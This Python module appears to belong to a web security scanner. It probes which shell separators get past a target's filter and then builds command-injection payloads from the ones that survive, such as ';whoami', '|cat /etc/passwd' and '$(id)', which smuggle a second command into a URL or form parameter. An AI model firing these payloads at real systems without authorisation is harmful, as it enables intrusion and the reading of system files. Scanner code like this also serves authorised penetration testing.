"""CMDi Smart Probe — separator-aware command-injection payload generator.

Probes which shell separators survive the application's filter and
emits payloads using only allowed separators.
"""

from __future__ import annotations

from utils.colors import log_info
from utils.request import ScanExceptions, smart_request

_CMDI_SEPARATORS = {
    "semicolon": ";",
    "pipe": "|",
    "double_pipe": "||",
    "ampersand": "&",
    "double_amp": "&&",
    "backtick": "`",
    "dollar_paren": "$(",
    "newline": "\n",
}

_CMDI_PAYLOADS_BY_SEP = {
    "semicolon": [";whoami", ";id", ";cat /etc/passwd", "; uname -a"],
    "pipe": ["|whoami", "|id", "|cat /etc/passwd", "| uname -a"],
    "double_pipe": ["||whoami", "||id"],
    "ampersand": ["&whoami", "&id"],
    "double_amp": ["&&whoami", "&&id"],
    "backtick": ["`whoami`", "`id`"],
    "dollar_paren": ["$(whoami)", "$(id)"],
    "newline": ["%0awhoami", "%0aid"],
}


def probe_cmdi_context(url, param, params, method="get", form_data=None, delay=0):
    """CMDi smart probe: detect filtered separators, emit payloads using survivors."""
    from urllib.parse import urlencode, urlparse, urlunparse

    result = {
        "allowed_separators": {},
        "smart_payloads": [],
    }

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    try:
        probe = "cybm4test"
        allowed = {}

        for sep_name, sep_char in _CMDI_SEPARATORS.items():
            test_val = f"{probe}{sep_char}{probe}"
            try:
                resp = _send(test_val)
                # Check if separator survived (not stripped by WAF)
                if resp.status_code != 403:
                    allowed[sep_name] = True
                else:
                    allowed[sep_name] = False
            except ScanExceptions:
                allowed[sep_name] = False

        result["allowed_separators"] = allowed

        # Generate payloads from allowed separators
        payloads = []
        for sep_name, is_ok in allowed.items():
            if is_ok:
                payloads.extend(_CMDI_PAYLOADS_BY_SEP.get(sep_name, []))

        result["smart_payloads"] = payloads

        allowed_list = [n for n, ok in allowed.items() if ok]
        blocked_list = [n for n, ok in allowed.items() if not ok]
        if payloads:
            log_info(f"  🧠 CMDi Probe [{param}]: {len(payloads)} targeted payloads")
            if allowed_list:
                log_info(f"     ✅ Separators: {', '.join(allowed_list)}")
            if blocked_list:
                log_info(f"     ❌ Separators: {', '.join(blocked_list)}")

    except ScanExceptions:
        pass

    return result
